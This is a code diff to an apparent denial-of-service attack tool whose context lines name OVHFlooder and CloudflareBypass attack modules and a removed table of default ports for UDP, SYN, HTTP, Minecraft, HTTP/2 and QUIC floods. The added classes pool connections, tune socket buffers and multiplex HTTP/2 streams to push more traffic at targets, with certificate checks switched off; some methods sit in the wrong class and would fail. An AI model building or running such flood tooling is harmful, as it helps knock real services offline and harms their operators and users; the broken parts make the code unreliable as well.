@@ -1,3 +1,6 @@
+from collections import defaultdict
+import queue
+from contextlib import contextmanager
 import random
 import socket
 import threading
@@ -47,6 +50,285 @@ MODERN_CIPHERS = [
     'TLS_AES_128_GCM_SHA256',
 ]
 
+class ConnectionPool:
+    
+    def __init__(self, max_connections_per_host: int = 50, max_idle_time: int = 30):
+        self.max_connections_per_host = max_connections_per_host
+        self.max_idle_time = max_idle_time
+        self.pools = defaultdict(queue.Queue)
+        self.connection_info = {}  # Track connection metadata
+        self.locks = defaultdict(threading.Lock)
+        self.cleanup_thread = None
+        self.running = True
+        self._start_cleanup_thread()
+    
+    def _start_cleanup_thread(self):
+        """Start background thread to cleanup stale connections"""
+        def cleanup_worker():
+            while self.running:
+                current_time = time.time()
+                for host_port in list(self.pools.keys()):
+                    with self.locks[host_port]:
+                        temp_queue = queue.Queue()
+                        while not self.pools[host_port].empty():
+                            try:
+                                conn = self.pools[host_port].get_nowait()
+                                conn_info = self.connection_info.get(id(conn), {})
+                                
+                                # Check if connection is still valid and not too old
+                                if (current_time - conn_info.get('created', 0) < self.max_idle_time and
+                                    self._is_connection_alive(conn)):
+                                    temp_queue.put(conn)
+                                else:
+                                    # Close stale connection
+                                    try:
+                                        conn.close()
+                                    except:
+                                        pass
+                                    self.connection_info.pop(id(conn), None)
+                            except queue.Empty:
+                                break
+                        
+                        # Put back valid connections
+                        while not temp_queue.empty():
+                            self.pools[host_port].put(temp_queue.get())
+                
+                time.sleep(5)  # Cleanup every 5 seconds
+        
+        self.cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
+        self.cleanup_thread.start()
+    
+    def _is_connection_alive(self, conn) -> bool:
+        """Check if connection is still alive"""
+        try:
+            # Use a non-blocking socket check
+            if hasattr(conn, 'sock'):
+                sock = conn.sock if hasattr(conn, 'sock') else conn
+                sock.settimeout(0.1)
+                sock.recv(0)
+            return True
+        except (socket.error, ssl.SSLError, AttributeError):
+            return False
+    
+    @contextmanager
+    def get_connection(self, host: str, port: int, use_ssl: bool = False):
+        """Get a connection from pool or create new one"""
+        host_port = f"{host}:{port}"
+        connection = None
+        
+        # Try to get existing connection from pool
+        with self.locks[host_port]:
+            if not self.pools[host_port].empty():
+                try:
+                    connection = self.pools[host_port].get_nowait()
+                    if not self._is_connection_alive(connection):
+                        connection.close()
+                        connection = None
+                except queue.Empty:
+                    pass
+        
+        # Create new connection if needed
+        if connection is None:
+            connection = self._create_connection(host, port, use_ssl)
+        
+        try:
+            yield connection
+        finally:
+            # Return connection to pool if still valid
+            if self._is_connection_alive(connection):
+                with self.locks[host_port]:
+                    if self.pools[host_port].qsize() < self.max_connections_per_host:
+                        self.pools[host_port].put(connection)
+                        self.connection_info[id(connection)] = {
+                            'created': time.time(),
+                            'host': host,
+                            'port': port
+                        }
+                    else:
+                        connection.close()
+            else:
+                try:
+                    connection.close()
+                except:
+                    pass
+    
+    def _create_connection(self, host: str, port: int, use_ssl: bool = False):
+        """Create optimized connection with proper socket settings"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        # Socket buffer tuning (implementation #3)
+        self._optimize_socket_buffers(sock, host, port)
+        
+        # Enable keep-alive (implementation #2)
+        self._enable_keepalive(sock)
+        
+        sock.connect((host, port))
+        
+        if use_ssl:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        return sock
+    
+    def shutdown(self):
+        """Shutdown connection pool and cleanup resources"""
+        self.running = False
+        if self.cleanup_thread:
+            self.cleanup_thread.join(timeout=1)
+        
+        # Close all pooled connections
+        for host_port in self.pools:
+            with self.locks[host_port]:
+                while not self.pools[host_port].empty():
+                    try:
+                        conn = self.pools[host_port].get_nowait()
+                        conn.close()
+                    except:
+                        pass
+
+    def _enable_keepalive(self, sock: socket.socket):
+        """Enable and optimize TCP keep-alive settings"""
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        
+        # Platform-specific keep-alive settings
+        if hasattr(socket, 'TCP_KEEPIDLE'):
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)  # Start after 60s
+        if hasattr(socket, 'TCP_KEEPINTVL'):
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)  # Interval 10s
+        if hasattr(socket, 'TCP_KEEPCNT'):
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)     # Max 6 probes
+
+class KeepAliveManager:
+    """Manage HTTP keep-alive connections with automatic renewal"""
+    
+    def __init__(self):
+        self.active_connections = {}
+        self.connection_stats = defaultdict(dict)
+        self.lock = threading.Lock()
+    
+    def register_connection(self, conn_id: str, connection, max_requests: int = 100):
+        """Register a connection for keep-alive management"""
+        with self.lock:
+            self.active_connections[conn_id] = {
+                'connection': connection,
+                'created': time.time(),
+                'requests_sent': 0,
+                'max_requests': max_requests,
+                'last_used': time.time()
+            }
+    
+    def use_connection(self, conn_id: str) -> bool:
+        """Use a connection and update its statistics"""
+        with self.lock:
+            if conn_id in self.active_connections:
+                conn_info = self.active_connections[conn_id]
+                conn_info['requests_sent'] += 1
+                conn_info['last_used'] = time.time()
+                
+                # Check if connection should be retired
+                if conn_info['requests_sent'] >= conn_info['max_requests']:
+                    self._retire_connection(conn_id)
+                    return False
+                return True
+        return False
+    
+    def _retire_connection(self, conn_id: str):
+        """Retire a connection that has reached its limit"""
+        if conn_id in self.active_connections:
+            try:
+                self.active_connections[conn_id]['connection'].close()
+            except:
+                pass
+            del self.active_connections[conn_id]
+
+    def _optimize_socket_buffers(self, sock: socket.socket, host: str, port: int):
+        """Optimize socket buffer sizes based on target and connection type"""
+        
+        # Base buffer sizes
+        base_send_buffer = 65536    # 64KB
+        base_recv_buffer = 65536    # 64KB
+        
+        # Port-specific optimizations
+        if port == 80 or port == 443:  # HTTP/HTTPS
+            send_buffer = base_send_buffer * 2    # 128KB for web traffic
+            recv_buffer = base_recv_buffer        # 64KB receive buffer
+        elif port == 22:  # SSH
+            send_buffer = 8192                    # 8KB for SSH
+            recv_buffer = 8192                    # 8KB receive buffer
+        else:  # Other ports
+            send_buffer = base_send_buffer
+            recv_buffer = base_recv_buffer
+        
+        # Apply buffer settings
+        try:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, send_buffer)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, recv_buffer)
+            
+            # TCP optimizations
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Disable Nagle
+            
+            # Additional optimizations for high-throughput connections
+            if port in [80, 443]:
+                if hasattr(socket, 'TCP_WINDOW_CLAMP'):
+                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, recv_buffer)
+                
+        except OSError as e:
+            # Some systems may not support all socket options
+            pass
+
+class AdaptiveBufferManager:
+    """Dynamically adjust buffer sizes based on performance"""
+    
+    def __init__(self):
+        self.target_buffers = defaultdict(lambda: {'send': 65536, 'recv': 65536})
+        self.performance_stats = defaultdict(list)
+        self.lock = threading.Lock()
+    
+    def get_optimal_buffers(self, host: str, port: int) -> Tuple[int, int]:
+        """Get optimal buffer sizes for a target"""
+        key = f"{host}:{port}"
+        with self.lock:
+            return self.target_buffers[key]['send'], self.target_buffers[key]['recv']
+    
+    def update_performance(self, host: str, port: int, throughput: float, latency: float):
+        """Update performance stats and adjust buffers if needed"""
+        key = f"{host}:{port}"
+        with self.lock:
+            self.performance_stats[key].append({
+                'throughput': throughput,
+                'latency': latency,
+                'timestamp': time.time()
+            })
+            
+            # Keep only recent stats (last 100 measurements)
+            self.performance_stats[key] = self.performance_stats[key][-100:]
+            
+            # Adjust buffers based on performance
+            self._adjust_buffers(key)
+    
+    def _adjust_buffers(self, key: str):
+        """Adjust buffer sizes based on performance history"""
+        stats = self.performance_stats[key]
+        if len(stats) < 10:  # Need enough data points
+            return
+        
+        recent_throughput = sum(s['throughput'] for s in stats[-10:]) / 10
+        recent_latency = sum(s['latency'] for s in stats[-10:]) / 10
+        
+        current_send = self.target_buffers[key]['send']
+        current_recv = self.target_buffers[key]['recv']
+        
+        # Increase buffers if throughput is high and latency is acceptable
+        if recent_throughput > 1000000 and recent_latency < 0.1:  # 1MB/s and <100ms
+            self.target_buffers[key]['send'] = min(current_send * 2, 1048576)  # Max 1MB
+            self.target_buffers[key]['recv'] = min(current_recv * 2, 1048576)
+        # Decrease buffers if latency is high
+        elif recent_latency > 0.5:  # >500ms
+            self.target_buffers[key]['send'] = max(current_send // 2, 8192)   # Min 8KB
+            self.target_buffers[key]['recv'] = max(current_recv // 2, 8192)
+    
 class OVHFlooder(AttackModule):
     def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                  threads: int = 5, debug: bool = False, proxy_manager=None, 
@@ -1067,17 +1349,84 @@ class CloudflareBypass(AttackModule):
         UI.print_success("Cloudflare bypass operation stopped successfully")
 
 
-def get_default_ports(method: str) -> List[int]:
-    """Get default ports based on attack method"""
-    default_ports = {
-        'udp': [53],         # Default DNS port for UDP flood
-        'syn': [80, 443],    # Common web ports for SYN flood
-        'http': [80, 443],   # Standard HTTP/HTTPS ports
-        'ovh': [80, 443],    # Add default ports for OVH
-        'cloudflare': [80, 443],  # Add default ports for Cloudflare
-        'minecraft': [25565], # Default Minecraft server port
-        'http2': [443],      # HTTP/2 typically requires TLS
-        'http3': [443],      # HTTP/3 typically requires QUIC over UDP
-        'quic': [443]        # QUIC protocol default port
-    }
-    return default_ports.get(method, [80])  # Default to port 80 if method not found
+class HTTP2ConnectionManager:
+    """
+    HTTP/2 connection manager for effective multiplexing
+    Handles stream lifecycle, prioritization, and connection pooling
+    """
+    def __init__(self, max_connections: int = 100, max_streams_per_connection: int = 100):
+        self.max_connections = max_connections
+        self.max_streams_per_connection = max_streams_per_connection
+        self.connections = {}
+        self.lock = threading.Lock()
+    
+    def get_connection(self, target: str, port: int) -> Tuple["h2.connection.H2Connection", ssl.SSLSocket]:
+        """Get or create an HTTP/2 connection to the target"""
+        key = f"{target}:{port}"
+        with self.lock:
+            if key not in self.connections or len(self.connections[key]) == 0:
+                # Create new connection
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                sock.settimeout(5)
+                sock.connect((target, port))
+                
+                h2_conn, tls_sock = self._setup_http2_connection(sock)
+                self.connections[key] = [(h2_conn, tls_sock)]
+                
+                return h2_conn, tls_sock
+            
+            # Reuse existing connection
+            h2_conn, tls_sock = self.connections[key][-1]
+            return h2_conn, tls_sock
+    
+    def _setup_http2_connection(self, sock: socket.socket) -> Tuple["h2.connection.H2Connection", ssl.SSLSocket]:
+        """Set up HTTP/2 connection over the given socket"""
+        if not HTTP2_AVAILABLE:
+            raise ImportError("HTTP/2 support requires the h2 package: pip install h2")
+            
+        # Convert to TLS socket
+        context = ssl.create_default_context()
+        context.set_alpn_protocols(['h2'])
+        tls_sock = context.wrap_socket(sock, server_hostname=sock.getpeername()[0])
+        
+        # Check if HTTP/2 was negotiated
+        if tls_sock.selected_alpn_protocol() != 'h2':
+            raise RuntimeError("Server doesn't support HTTP/2")
+        
+        # Create HTTP/2 connection
+        conn = h2.connection.H2Connection()
+        conn.initiate_connection()
+        
+        # Update settings
+        settings = {
+            h2.settings.INITIAL_WINDOW_SIZE: 65535,
+            h2.settings.MAX_CONCURRENT_STREAMS: self.max_streams_per_connection,
+            h2.settings.MAX_FRAME_SIZE: 16384
+        }
+        conn.update_settings(settings)
+        
+        # Send initial data
+        tls_sock.sendall(conn.data_to_send())
+        
+        return conn, tls_sock
+    
+    def close_connection(self, target: str, port: int):
+        """Close the HTTP/2 connection to the target"""
+        key = f"{target}:{port}"
+        with self.lock:
+            if key in self.connections and len(self.connections[key]) > 0:
+                h2_conn, tls_sock = self.connections[key].pop()
+                try:
+                    h2_conn.close_connection()
+                    tls_sock.sendall(h2_conn.data_to_send())
+                    tls_sock.close()
+                except:
+                    pass
+    
+    def close_all(self):
+        """Close all managed connections"""
+        with self.lock:
+            for key in list(self.connections.keys()):
+                self.close_connection(*key.split(":"))
